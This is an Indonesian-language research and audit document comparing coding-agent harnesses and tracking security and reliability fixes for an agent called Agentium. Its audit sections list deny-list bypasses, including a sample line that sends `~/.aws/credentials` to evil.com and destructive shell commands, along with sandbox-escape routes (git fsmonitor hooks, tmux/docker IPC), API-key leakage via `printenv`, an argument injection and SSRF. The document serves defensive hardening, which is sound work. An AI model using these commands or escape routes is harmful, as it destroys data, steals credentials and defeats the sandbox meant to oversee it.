# Riset Lanjutan: Agent yang Andal & Celah Agentium v0.1

*Data per 23 Sep 2026. [P] = sumber pertama (vendor/paper). [S] = sumber sekunder. [U] = belum terverifikasi.*

---

## A. Agent yang paling andal, dan kenapa

| Agent | Status 2026 | Yang membuatnya andal | Kelemahan |
|---|---|---|---|
| **Codex CLI** | aktif, Rust | Sandbox OS, cek setelah tiap tool call, ~4× lebih hemat token. 83,4% Terminal-Bench 2.1 | Terkunci ke OpenAI |
| **Augment Auggie v2** | aktif | **Tool minimal** (bash/read/edit/write) + retrieval satu tool + compaction dini dengan model murah. **53% lebih murah** dari Claude Code, TB2 naik dari 70,8% ke 74,2%. 51,8% SWE-bench Pro [P] | Context Engine berbayar |
| **ForgeCode** | aktif | Skema tool datar (`required` di depan), notice pemotongan yang jelas, **verifikasi wajib sebelum selesai**. Skor naik dari 78,4% ke 81,8% [P] | Skor TB2 tercemar kebocoran jawaban; bersihnya ~71,7% [P, DebugML] |
| **Factory Droid** | aktif | Sedikit tool, format edit dipilih per model, pengingat di tengah sesi, survei lingkungan di awal, timeout pendek [P] | Closed source |
| **Warp** | aktif | Pindah ke model lain saat error atau tool call rusak (~2% run), streaming output perintah panjang, pty interaktif. 75,8% SWE-bench Verified [P] | Cloud run sering putus |
| **OpenHands** | aktif | 5 rollout + critic dan filter tes (60,6% → 66,4%), condenser (biaya ~½), **StuckDetector** [P] | Pernah membunuh proses panjang yang sebenarnya sehat |
| **Junie** (JetBrains) | GA Jun 2026 | Plan-first, test-first, inspeksi IDE. #1 SWE-Rebench 61,6% dengan $1,14/tugas [P] | Lambat, kuota kredit |
| **Copilot CLI** | GA Feb 2026 | Plan/Autopilot, subagent, auto-compaction 95%, repo memory, hooks pre/postToolUse, rewind [P]. Coding agent-nya menjalankan CodeQL, secret scan, dan self-review sebelum PR [P] | Firewall mati di runner self-hosted |
| **Cursor** | aktif | Indeks semantik (+12,5% akurasi), sandbox OS + allowlist jaringan [P] | Sandbox CLI dilaporkan tidak jalan [S] |
| **Cline** | aktif | Plan/Act, checkpoint 3 mode, hooks [P] | 80–150k token per request, loop perbaikan 20–40× [S] |
| **Kiro** (AWS) | aktif | Spec (EARS) → design → tasks, property-based test, hooks, checkpoint [S] | Berlebihan untuk edit kecil |
| **Aider** | melambat (v0.86.2, Feb 2026) | **Format edit per model** (udiff menaikkan skor "anti-malas" dari 20% ke 61%), repo map, auto-commit git [P] | Tidak ada loop agent |
| **Zed** | aktif | Checkpoint di setiap edit, host ACP untuk agent lain [P] | Tidak ada benchmark |
| **mini-swe-agent / Pi** | aktif | ~100 baris / 4 tool, > 74% SWE-bench Verified [P] | Tanpa memori dan sandbox |
| **Roo Code** | **tutup** (Mei 2026) | — | Pindah ke Kilo/Roomote [S] |

### Teknik yang terbukti, diurutkan dari bukti terkuat

| # | Teknik | Efek terukur |
|---|---|---|
| 1 | **Beberapa rollout + verifier/critic + filter tes** | +5,8 s.d. +14,6 poin (Trae, OpenHands, Anthropic) |
| 2 | **Desain harness secara keseluruhan** | Selisih 10–20 poin untuk model yang sama (SWE-bench Pro) |
| 3 | **Edit tool yang me-lint dan menolak edit rusak** | 18,0% vs 10,3% (ablasi SWE-agent) |
| 4 | **Perbaikan struktural (tool, middleware, memori), bukan prompt** | +7,3 poin, dan berlaku lintas model (+5 s.d. +10) (AHE) |
| 5 | **Verifikasi wajib sebelum boleh selesai** | Porsi terbesar dari +3,4 ForgeCode. Critic plan Jules mengurangi gagal 9,5% |
| 6 | **Tampilan file/output yang dibatasi** | Jendela 100 baris 18% vs file utuh 12,7% |
| 7 | **Format edit per model** | Skor "anti-malas" 20% → 61% (Aider) |
| 8 | **Sedikit tool, skema datar, `required` di depan** | Bagian dari +3,4 ForgeCode |
| 9 | **Notice pemotongan + paginasi + respons ringkas** | Token −65% (Anthropic) |
| 10 | **Kondensasi konteks** | Biaya sesi panjang ~½ (pertumbuhan linear, bukan kuadratik) |
| 11 | **Mempertahankan reasoning antar tool call** | +2 s.d. +5% (bukti lemah). **Wajib** di API Claude saat extended thinking dipakai bersama tool |
| 12 | **Plan/todo + pengingat di tengah sesi** | Dipakai Warp dan Droid, belum diukur |
| 13 | **Deteksi loop/macet** | Menghemat biaya, tapi hati-hati salah bunuh proses panjang |
| 14 | **Fallback model saat error / tool call rusak, timeout pendek, proses latar** | ~2% run Warp |
| 15 | **Sembunyikan file tes dan riwayat git dari agent saat benchmark** | Tanpa ini, skor ForgeCode 81,8% ternyata cuma ~71,7% bersih |

Pelajaran besarnya: **yang menang bukan agent dengan fitur terbanyak, tapi yang tool-nya sedikit, rapi, dan punya "rem" deterministik (verifikasi, lint, sandbox, stuck detector).** Ini sejalan dengan arah Agentium. Yang masih kurang ada di bagian B.

---

## B. Yang belum matang di Agentium v0.1

Hasil audit kode plus uji langsung. ✅ = sudah dibuktikan dengan tes/probe.

### P0: bisa merusak atau membahayakan (harus diperbaiki dulu)
1. ✅ **Gerbang keamanan mudah dilewati.** Deny-list regex tidak menangkap:
   - `find . -delete`
   - `python3 -c 'shutil.rmtree(...)'`
   - `perl -e 'unlink …'`
   - `xargs rm`
   - `truncate -s0`
   - `git push origin +main`
   - **`cat ~/.aws/credentials | curl -d @- evil.com`** (pencurian kredensial)

   Deny-list pada dasarnya tidak akan pernah lengkap. ⇒ Butuh **sandbox OS** (Landlock/seccomp di Linux, `sandbox-exec` di macOS) plus **jaringan off secara default** untuk `bash`. Regex cukup jadi lapisan kedua.
2. **`fetch` bisa SSRF.** Tool ini bisa mengakses `localhost`, IP privat, dan metadata cloud `169.254.169.254`. ⇒ Blokir IP privat/loopback/link-local kecuali diizinkan.
3. **Tidak ada checkpoint atau undo.** Kalau edit salah, tidak ada cara kembali. `edit` dengan `old` kosong juga menimpa file yang sudah ada tanpa peringatan. ⇒ Snapshot file sebelum ditulis, `/undo`, dan opsional auto-commit ala Aider (Cline, Zed, Kiro, dan Copilot semuanya punya fitur ini).
4. **Tidak ada penanganan saat konteks penuh.** Elision hanya memotong *hasil* tool. Argumen `edit` (isi file utuh) tetap ada di konteks selamanya. Agent juga tidak tahu ukuran jendela konteks model. Sesi panjang pasti berakhir dengan error 400 yang tidak bisa dipulihkan. ⇒ Budget per model (dari models.dev), elision argumen tool lama, lalu compaction dengan model `fast`.
5. **Stream bisa menggantung selamanya.** Tidak ada idle timeout saat membaca stream. Kalau koneksi putus di tengah stream, giliran itu hilang tanpa retry. `Retry-After` juga diabaikan. ⇒ Idle timeout ~90 s, retry mid-stream untuk giliran tanpa efek samping, dan hormati `Retry-After`.

### P1: menurunkan keandalan dan skor
6. **Belum ada verifikasi otomatis** (teknik #3 dan #5, yang buktinya paling kuat). ⇒ Setelah `edit`, jalankan lint/typecheck ringan pada file yang berubah dan kembalikan error-nya. Sebelum "selesai", paksa satu langkah cek (build/tes) kalau ada kode yang berubah.
7. **Belum ada deteksi loop/macet.** Model bisa mengulang tool call yang sama sampai `max-turns` (100). ⇒ Deteksi pemanggilan identik berulang, error identik, dan pola A/B ping-pong, lalu sisipkan peringatan atau hentikan.
8. **Edit tool masih kaku.** Tidak ada pencocokan toleran (spasi, indentasi, CRLF), tidak ada diff yang ditampilkan ke user, dan tidak ada cek "file berubah sejak terakhir dibaca". ⇒ Fallback fuzzy yang aman (normalisasi whitespace, harus cocok unik), tampilkan diff ringkas, dan tolak tulis kalau file berubah di luar agent.
9. ✅ **`search` tidak mencari file tersembunyi** (`.github/`, `.env.example`, `.eslintrc`). ⇒ Pakai `rg --hidden -g '!.git'`.
10. **Tidak ada dukungan reasoning/thinking.**
    - Blok `thinking` dari Claude diabaikan, padahal wajib dikirim balik kalau extended thinking dipakai bersama tool.
    - `reasoning_content` (DeepSeek, Qwen, dll.) tidak ditampilkan.
    - Tidak ada opsi tingkat reasoning.
    - `max_tokens` ditolak oleh model OpenAI baru, yang memakai `max_completion_tokens`.
11. **Jawaban yang terpotong (`max_tokens`/`length`) tidak ditangani.** Tool call yang terpotong jadi error JSON dan user tidak diberi tahu. ⇒ Deteksi, beri tahu, lalu lanjutkan otomatis sekali.
12. **Tidak ada fallback model.** Slot model `fast` juga belum dipakai sama sekali (ide Warp).
13. **Hasil tool belum memberi petunjuk lanjutan** (teknik #9). Contohnya: `read` yang dipotong harus menyebut `offset` berikutnya secara eksplisit (sudah), tapi `bash` dan `search` belum memberi tahu cara melihat bagian yang dipotong.
14. **Belum diuji dengan model sungguhan.** Semua tes memakai server palsu. Nama model default (`gpt-5.5`, `gemini-3.5-flash`, `claude-sonnet-5`) belum dicek ke API.

### P2: janji produk yang belum ada
15. **Memori** (USER/MEMORY, FTS5 auto-recall, `@remember`/`@decide`). Ini pembeda utama yang dijanjikan, dan belum ada sama sekali.
16. **Login luas:** belum ada OAuth ChatGPT/Copilot/OpenRouter, Bedrock/Vertex/Azure, protokol Gemini native, dan registry models.dev (daftar model, jendela konteks, harga → tampilan biaya).
17. **Mode headless untuk CI/skrip:** output event JSON (`--json`), exit code yang bermakna, dan `--max-cost`.
18. **Pengalaman terminal:**
    - Belum ada riwayat dan edit baris (panah atas/bawah).
    - Belum ada input multi-baris.
    - Belum ada render markdown.
    - Belum ada `/sessions` untuk memilih sesi.
    - Folder sesi tumbuh tanpa batas.
19. **Benchmark masih mainan.** Baru 5 tugas sepele. Belum ada adaptor Terminal-Bench 2.1 / SWE-bench Pro. Tes dan riwayat git juga harus diisolasi dari agent supaya skornya jujur (teknik #15).
20. **Distribusi:** belum ada release binary (goreleaser), skrip install, dan file LICENSE.
21. **Kredensial disimpan plaintext** di `auth.json`, walau sudah 0600. Belum memakai keychain OS.
22. **Ekstensi minimal:** hooks pre/post tool (Copilot, Kiro, Cursor) dan MCP. Keduanya harus opsional supaya tidak menambah token.
23. **Paralel untuk tugas besar:** beberapa rollout + pemilih (teknik #1) sebagai mode opsional `--best-of N`, karena biayanya mahal.

---

## C. Roadmap yang direvisi

Urutan berubah: **keamanan dan keandalan dulu, baru fitur.**

| Versi | Isi | Alasan |
|---|---|---|
| **v0.2 Aman** | Sandbox OS + jaringan off default untuk bash; blokir SSRF di fetch; checkpoint/`/undo`; peringatan overwrite; `rg --hidden`; idle timeout stream + `Retry-After` | P0 #1, #2, #3, #5, #9 |
| **v0.3 Andal** | Lint/verifikasi otomatis setelah edit + verifikasi wajib sebelum selesai; stuck detector; edit fuzzy aman + diff; jawaban terpotong; budget konteks per model + elision argumen + compaction dengan model `fast` | P0 #4, P1 #6, #7, #8, #11. Bukti terkuat (+7 s.d. +8 poin) |
| **v0.4 Ingat** | Memori berlapis + auto-recall FTS5 + decision log | P2 #15 |
| **v0.5 Luas** | models.dev, reasoning/thinking, `max_completion_tokens`, Gemini native, OAuth ChatGPT/Copilot/OpenRouter, Bedrock/Vertex/Azure, fallback model, keychain | P1 #10, #12, P2 #16, #21 |
| **v0.6 Terbukti** | Adaptor Terminal-Bench 2.1 + SWE-bench Pro dengan isolasi tes, `--best-of N`, `--json` headless, release binary | P2 #17, #19, #20, #23 |
| **v0.7 Cerdas & Bisa Diperluas** | Plan mode read-only, skills `SKILL.md` + manager yang aman, code map (outline + cari simbol), input gambar, render markdown | Plan-first (Junie, Copilot, Cline), repo map (Aider), ekosistem skill bersama Claude Code/Codex |

Sumber: laporan riset di bagian A (tautan lengkap di bawah).

**Harness & benchmark**
- https://forgecode.dev/blog/gpt-5-4-agent-improvements/ · https://debugml.github.io/cheating-agents/
- https://factory.com/news/terminal-bench · https://www.warp.dev/blog/terminal-bench · https://www.warp.dev/blog/swe-bench-verified-update
- https://www.openhands.dev/blog/sota-on-swe-bench-verified-with-inference-time-scaling-and-critic-model · https://docs.openhands.dev/sdk/guides/agent-stuck-detector
- https://arxiv.org/pdf/2405.15793 (SWE-agent ACI) · https://arxiv.org/abs/2507.23370 (Trae) · https://arxiv.org/abs/2410.20285 (SWE-Search) · https://arxiv.org/abs/2604.25850 (AHE) · https://arxiv.org/abs/2604.03515 (taksonomi scaffold)
- https://www.anthropic.com/engineering/writing-tools-for-agents · https://platform.claude.com/docs/en/build-with-claude/thinking
- https://www.augmentcode.com/blog/auggie-cli-harness-rebuild-53-percent-cheaper · https://www.augmentcode.com/blog/auggie-tops-swe-bench-pro
- https://aider.chat/docs/unified-diffs.html · https://jules.google/docs/changelog/2026-01-26-1/
- https://www.digitalapplied.com/blog/swe-bench-verified-june-2026-benchmark-vs-scaffolding-analysis

**Agent**
- https://github.blog/changelog/2026-02-25-github-copilot-cli-is-now-generally-available/ · https://cursor.com/blog/semsearch · https://cursor.com/blog/agent-sandboxing
- https://docs.cline.bot/core-workflows/plan-and-act · https://blog.jetbrains.com/junie/2026/06/junie-coding-agent-out-of-beta/ · https://zed.dev/docs/ai/agent-panel
- https://vibecodinghub.org/blog/roo-code-shutdown · https://kilo.ai/articles/roo-to-kilo-migration-guide · https://www.letta.com/blog/letta-code/

---

## D. Status tiap item (v0.7.0)

| # | Item | Status |
|---|---|---|
| P0-1 | Gerbang keamanan bisa dilewati | ✅ Sandbox OS (Landlock / sandbox-exec): tulis hanya di workspace dan cache, jaringan mati kecuali `net=true` disetujui. Deny-list diperluas jadi lapisan kedua. Membaca kredensial perlu persetujuan. |
| P0-2 | SSRF di `fetch` | ✅ localhost, IP privat, link-local/metadata, dan CGNAT diblokir. Dicek sebelum request, di setiap redirect, dan saat koneksi dibuka. |
| P0-3 | Tidak ada undo | ✅ Checkpoint shadow-git per giliran, `/undo` + `agentium undo`, penjaga overwrite buta, dan penjaga file yang sudah berubah sejak dibaca. |
| P0-4 | Konteks penuh | ✅ Ukuran jendela konteks per model, elision output dan argumen edit lama, compaction dengan `fast_model`. |
| P0-5 | Stream menggantung | ✅ Idle timeout 120 dtk, deteksi stream tidak lengkap, retry (termasuk di tengah stream) yang menghormati `Retry-After`. |
| P1-6 | Verifikasi otomatis | ✅ Lint gate pada edit (Go/JSON/Python/shell/JS) + satu pengingat verifikasi sebelum selesai. |
| P1-7 | Deteksi macet | ✅ Peringatan di 3×, berhenti di 5× (panggilan dan hasil yang sama). |
| P1-8 | Edit tool kaku | ✅ Toleran CRLF, spasi di akhir baris, dan indentasi (dengan re-indent), plus diffstat. |
| P1-9 | File tersembunyi di search | ✅ `rg --hidden` tanpa `.git`. |
| P1-10 | Reasoning/thinking | ✅ Adaptive thinking + effort, blok bertanda tangan dikirim balik tanpa diubah, `drop_block` untuk model yang mewajibkan riwayat append-only, `reasoning_effort`, `max_completion_tokens`, `reasoning_content`, thought signature Gemini. |
| P1-11 | Jawaban terpotong | ✅ Tool call yang setengah jadi dibuang, model diminta melanjutkan (maksimal 2×). |
| P1-12 | Fallback / model fast | ✅ Rantai `fallback` yang lengket; `fast_model` dipakai untuk compaction dan `tidy`. |
| P1-13 | Petunjuk di output tool | ✅ Output yang dipotong memberi tahu cara melihat sisanya. |
| P1-14 | Uji dengan API asli | ❌ Belum. Tidak ada API key di lingkungan build. |
| P2-15 | Memori | ✅ Snapshot USER/MEMORY, log keputusan, journal, recall BM25 otomatis, `tidy`, penyamaran secret, dan filter injeksi. |
| P2-16 | Login luas | ✅ models.dev (180+ provider), OAuth OpenRouter, GitHub Models, Azure, Bedrock (SigV4), Vertex, keychain OS. ❌ OAuth ChatGPT/Copilot (butuh client ID resmi). Protokol Gemini native diganti endpoint kompatibel + thought signature. |
| P2-17 | Headless | ✅ `--json` (JSON Lines), exit code 0/1/2/130, `--max-cost`. |
| P2-18 | UX terminal | ✅ Line editor, riwayat, paste, `/sessions`, `/resume`, pembersihan sesi, render markdown saat streaming (hanya di terminal; pipe tetap mentah). |
| P2-19 | Benchmark sungguhan | ✅ Adaptor Harbor untuk Terminal-Bench 2.x (isolasi jawaban ditangani Harbor). ❌ Belum dijalankan. |
| P2-20 | Distribusi | ✅ goreleaser + workflow rilis + `install.sh` (dengan checksum). ❌ LICENSE (keputusan pemilik repo). |
| P2-21 | Kredensial plaintext | ✅ Keychain OS kalau tersedia. |
| P2-22 | Ekstensi | ✅ Hook `post_edit` / `stop`, MCP stdio (tool `mcp__server__tool`). |
| P2-23 | Paralel untuk tugas besar | ✅ `--best-of N --check CMD` di git worktree. |
| v0.7-a | Plan mode | ✅ `--plan`, `/plan`, `/go`. Edit ditolak; dengan sandbox workspace jadi read-only sehingga perintah apa pun yang tidak merusak tetap bisa jalan; tanpa sandbox hanya allowlist perintah baca. Catatan plan masuk ke pesan user supaya system prompt tetap ter-cache. |
| v0.7-b | Skills / plugin | ✅ Format `SKILL.md` (sama dengan Claude Code dan Codex). Hanya indeks satu baris per skill di prompt; `/nama` menjalankan skill. `agentium skills add` mengambil tanpa menjalankan apa pun, mengunci commit, menampilkan script, dan baru memasang setelah dikonfirmasi. Tanpa marketplace. |
| v0.7-c | Code map | ✅ `read {outline:true}` untuk file dan direktori, `search {symbol:…}`. Go lewat `go/parser`, bahasa lain lewat pola baris. |
| v0.7-d | Input gambar | ✅ `read` pada gambar dan `@file.png` di prompt, untuk model yang mendukung gambar (models.dev, atau keluarga model multimodal yang dikenal). |

**Langkah berikutnya yang paling berdampak:** uji nyata dengan API key (`agentium bench -m …`), lalu jalankan Terminal-Bench 2.x dan bandingkan dengan Codex CLI / Claude Code / Pi pada model yang sama.

---

## E. Analisis ulang v0.7.0 (23 Sep 2026)

Dua sumber: riset lanskap agent terbaru (leaderboard Terminal-Bench, changelog resmi) dan audit kode adversarial. Setiap temuan audit dibuktikan dengan percobaan.

### E1. Posisi pasar terbaru

| Harness | Model | Skor | Sumber |
|---|---|---|---|
| Codex CLI | GPT-6 Astra | TB2.1 87,4% · TB4.0 58,2% | snorkel.ai/leaderboard |
| Claude Code | Fable 5 / 5.1 | TB2.1 83,8% · TB4.0 57,9% | snorkel.ai/leaderboard |
| Terminus 2 (harness generik) | Fable 5 | TB2.1 80,4% | snorkel.ai/leaderboard |
| Cursor CLI | Grok 4.5 | TB2.1 79,3% | snorkel.ai/leaderboard |
| mini-SWE-agent (hanya bash) | Muse Spark 1.1 | TB2.1 76,2% | snorkel.ai/leaderboard |

Dengan model yang sama, harness vendor hanya unggul 3–5 poin atas harness generik. Artinya harness minimal bisa bersaing, **asal dibuktikan dengan run nyata**.

### E2. Kelebihan Agentium (yang masuk akal, tapi sebagian belum terukur)

| Kelebihan | Pembanding | Status bukti |
|---|---|---|
| Binary statis 8 MB, start ~4 ms, RAM ~8 MB | Claude Code, OpenCode, Kilo, Pi, dan Copilot pakai Bun/Node. OpenCode pernah bocor memori sampai 14 GB | Terukur di sisi kita saja |
| Overhead prompt ~810 token | Hermes ~13,9k token per call (73% tiap call). Pi juga < 1k | Terukur |
| Netral provider (models.dev 180+, Bedrock, Vertex, fallback) | Anthropic sempat melarang OAuth langganan untuk agent pihak ketiga; Gemini CLI ditutup untuk konsumen 18 Jun 2026 | Arsitektur |
| Installer skill yang di-pin commit dan direview dulu | ClawHub (OpenClaw) berisi 341 s.d. 1.184+ skill berbahaya | Arsitektur (bug E3-10 harus ditutup dulu) |
| Checkpoint + penjaga stale/overwrite + lint gate sekaligus | Jarang ada yang punya ketiganya | Belum diukur |
| Memori yang bisa diaudit (DECISIONS.md + supersedes, recall BM25, redaksi) | Skill otomatis Hermes menumpuk fakta basi | Belum diukur |

### E3. Bug dan celah dari audit (terverifikasi)

| # | Tingkat | Masalah | Perbaikan |
|---|---|---|---|
| 1 | Tinggi | Allowlist read-only plan mode bisa ditembus: `git grep -Orm …` menghapus file, `sort -uo`, `sort --compress-program`, `uniq in out`, `find -fprint0`, `rg --hostname-bin`, `git remote -v add` | Allowlist per flag, bukan cek prefix |
| 2 | Tinggi | Dari dalam sandbox, `.git/config` (fsmonitor/hooks) dan folder bin di PATH (`~/go/bin`, pnpm) bisa ditulisi, lalu dijalankan di luar sandbox oleh `git status` berikutnya atau `--best-of` | `.git` read-only di sandbox, keluarkan folder bin, dan git internal dijalankan dengan `-c core.fsmonitor= -c core.hooksPath=/dev/null` |
| 3 | Tinggi | Di kernel < 6.7 (Debian 12, RHEL 9, Ubuntu 22.04) jaringan **tidak** diblok, tapi banner dan model tetap diberi tahu "diblok" | Tampilkan peringatan; jujur ke model |
| 4 | Tinggi | Eksfiltrasi kredensial: `env` / `printenv ANTHROPIC_API_KEY` tidak dianggap berisiko, bash mewarisi API key, dan `fetch` tidak pernah lewat gate | Buang `*_API_KEY` / `*_TOKEN` / `AWS_*` dari env bash dan MCP; gate `fetch` |
| 5 | Tinggi | Lolos sandbox lewat IPC (`tmux run-shell`, `docker`, `systemd-run`) | Tandai berisiko; plan mode tetap pakai allowlist |
| 6 | Sedang | `/skill` hilang kalau memori menemukan recall (`send = block + input` menimpa skill) | `block + send` |
| 7 | Sedang | Gambar tetap di riwayat setelah pindah ke model tanpa vision, jadi 400 terus. Gambar user tidak pernah di-elide | Ganti dengan placeholder; elide gambar lama |
| 8 | Sedang | Renderer markdown: state fence tidak di-reset antar balasan; `a ** b` dan `src/**/*.go` rusak; CRLF | Reset per balasan; aturan `**` yang ketat |
| 9 | Sedang | `read` tanpa batas ukuran: `/dev/zero` bikin OOM, FIFO menggantung | Hanya file reguler, baca dengan batas |
| 10 | Sedang | `skills add '--upload-pack=…://x'` menjalankan perintah sebelum review | Tolak argumen berawalan `-`, pakai `--` |
| 11 | Sedang | Line editor salah hitung lebar karakter CJK/emoji | Tabel lebar East Asian |

Temuan rendah: `impl<'a>` di Rust, `def` di dalam docstring Python, `ForCwd` membaca sesi penuh, `Attach` bocor ke giliran berikutnya kalau skill gagal, pemotongan UTF-8, stderr MCP dibuang.

### E4. Yang dimiliki 3+ agent utama tapi belum ada di Agentium (urut dampak)

1. **Subagent / delegasi paralel** (Claude Code, Codex, Gemini/Antigravity, OpenCode, Copilot `/fleet`, Cursor, Amp, Droid). `--best-of` hanya menutup kasus "coba N kali".
2. **Bukti benchmark nyata**: TB2.1 dan TB4.0 lewat Harbor.
3. **Diagnostik LSP** (Claude Code, OpenCode): error tipe lintas file dan find-references.
4. **Proses latar + PTY interaktif** untuk dev server, REPL, dan perintah yang bertanya. Sering muncul di tugas Terminal-Bench.
5. **Tool todo/plan**: murah, dan Warp mengaitkannya dengan kenaikan skor.
6. **Web search.**
7. **MCP HTTP/SSE + OAuth.**
8. **ACP** (jalur termurah ke Zed/JetBrains).
9. **Windows yang layak**: saat ini tanpa sandbox dan tanpa bash fallback yang benar.
10. **LICENSE** (keputusan pemilik).

### E5. Urutan kerja yang disarankan (v0.8 "Kokoh")

1. Tutup E3 #1–#11 beserta tes regresi, dan koreksi klaim README.
2. Todo tool + proses latar (`bash {background:true}`, lalu baca output dan hentikan).
3. Subagent sederhana (tool `task`: konteks terpisah, hanya ringkasan yang kembali).
4. Diagnostik LSP opsional (gopls / tsserver / pyright kalau terpasang).
5. Run Terminal-Bench 2.1 nyata, dengan API key milik pemilik.

---

## F. Pemetaan kode dan memori: sebelum dan sesudah v0.8.0

Riset ketiga (Sep 2026) menghasilkan tiga temuan pokok:
1. Retrieval harus presisi, kalau tidak justru merugikan. CodeGrep (arxiv 2608.05886): suntikan BM25 **menurunkan** resolve rate; hanya retriever dengan presisi ~0,68 yang membantu.
2. Konteks yang selalu disuntikkan menambah biaya. ETH Zurich 2026: file konteks buatan LLM −0,5% s.d. −2%, dan +20% biaya.
3. Memori harus kecil, divalidasi, dan dibatasi. Copilot memvalidasi sitasi saat dipakai dan memberi kedaluwarsa: merge rate PR 83% → 90%. Di VibeMemBench, 11 dari 12 sistem memori otomatis kalah dari tanpa memori.

### F1. Pemetaan file, folder, dan kode

| Aspek | v0.7 (sebelum) | v0.8 (sekarang) | Pembanding |
|---|---|---|---|
| Folder | Daftar 1 level | Pohon rekursif, patuh .gitignore, level dalam diringkas jadi jumlah file | Claude Code: ls/glob |
| Indeks | Scan ulang semua file tiap panggilan | Indeks per proyek di disk, hanya file berubah yang diparse ulang, paralel. Go stdlib ~13k file: 3,3 dtk pertama, 0,46 dtk berikutnya, cari simbol ~70 ms | Aider: cache tag per mtime |
| Definisi | `search {symbol}` | Sama, tapi instan dari indeks | LSP go-to-definition |
| Pemakaian | Tidak ada | `search {refs}` + fungsi pembungkus (`[in App.run]`); komentar dan definisi dikecualikan | LSP find-references (Claude Code, OpenCode) |
| Peta repo | Semua file urut abjad (bisa ~12k token) | Peta berperingkat ala Aider: graf identifier + PageRank + fokus ke file yang disentuh, dibatasi ~2k token, **on-demand** | Aider (1k token, disuntik); kita on-demand sesuai temuan riset |
| Akurasi parser | Salah pada lifetime Rust, docstring Python, template string, CRLF | Scanner berstatus: komentar blok, string multi-baris, char literal, docstring, CRLF | Tree-sitter (Aider) lebih akurat |

**Masih kurang:** belum ada LSP (error tipe lintas file, rename aman); bahasa selain Go masih berbasis pola baris, bukan parser penuh; embedding sengaja tidak dipakai (bukti netral/negatif).

### F2. Memori jangka panjang

| Aspek | Sebelum | Sekarang |
|---|---|---|
| Kunci proyek | Direktori kerja (subfolder = memori terpisah) | Root git: satu memori per repo |
| Fakta basi | Selamanya di prompt | Tanggal + sitasi file; disembunyikan kalau file hilang atau tidak dikonfirmasi 120 hari; `tidy` meninjaunya |
| Duplikat | Hanya yang persis sama | Mirip ≥ 60% (Jaccard) → **update**, bukan ditumpuk |
| Recall otomatis | Hingga 4 hit, 1.500 karakter, ambang skor absolut | Maks 2 hit, 700 karakter; minimal 2 kata kueri dan ≥ 50% kata kueri harus cocok |
| Recall on-demand | Tidak ada | `search {memory}` |
| Pelajaran dari error | Tidak dicatat | Jurnal mencatat error tiap giliran |
| Keracunan memori | Filter injeksi | + tulisan dari giliran yang membaca web/MCP **ditahan** untuk ditinjau |
| Ukuran snapshot | 3.700 karakter | 3.000 karakter |

### F3. Memori jangka pendek (dalam sesi)

| Aspek | Sebelum | Sekarang |
|---|---|---|
| State kerja | Hanya di ringkasan LLM | **Ledger** deterministik: file dibaca/diubah, 10 perintah terakhir + exit code, error terakhir yang belum beres (verbatim, hilang otomatis saat perintah yang sama lulus) |
| Daftar tugas | Tidak ada | Tool `todo` (maks 12 item) |
| Setelah compaction | Ringkasan LLM saja | Ringkasan + ledger + todo apa adanya (pola Claude Code/Codex/OpenCode) |
| Masking output lama | Elision di 55% jendela | Sama (JetBrains 2025: masking ≈ ringkasan LLM dengan biaya ~½) |

**Catatan jujur:** semua perbaikan ini didasarkan pada bukti eksternal dan tes unit/e2e. Belum ada pengukuran end-to-end dengan model asli (butuh API key). Celah keamanan E3 #1–#5 dan #7–#11 belum ditutup; #6 (skill + recall) sudah diperbaiki.


---

## G. Status v0.10.0 — yang sebelumnya kurang, sekarang ada

| Kekurangan (bagian E4) | Status |
|---|---|
| Subagent / delegasi paralel | ✅ Tool `task`: konteks bersih, paralel, mode `explore` read-only. Memakai prompt dan daftar tool yang sama dengan induk, jadi prompt cache tetap kena |
| Proses latar + input interaktif | ✅ `bash {background}` + `{job, stdin, kill}`. Belum ada PTY penuh (program yang mewajibkan TTY) |
| Diagnostik LSP | ✅ gopls, pyright, typescript-language-server, rust-analyzer, clangd. Diuji dengan pyright dan gopls asli |
| Tool todo/plan | ✅ `todo` (v0.8) |
| Web search | ✅ Brave / Tavily / DuckDuckGo |
| MCP HTTP/SSE | ✅ Streamable HTTP (session, versi protokol, header auth) + SSE lama. ❌ OAuth MCP (pakai header `Authorization`) |
| ACP (integrasi IDE) | ✅ `agentium acp`: streaming, tool call, plan, izin, mode, MCP dari editor. Diuji e2e dengan client tiruan, belum dengan Zed/JetBrains asli |
| Windows | ✅ Git Bash / PowerShell, kill sampai proses anak, warna ANSI, CI windows-latest. ❌ Tanpa sandbox OS, tanpa line editor |
| Bukti benchmark nyata | ❌ Masih butuh API key |
| LICENSE | ❌ Keputusan pemilik repo |
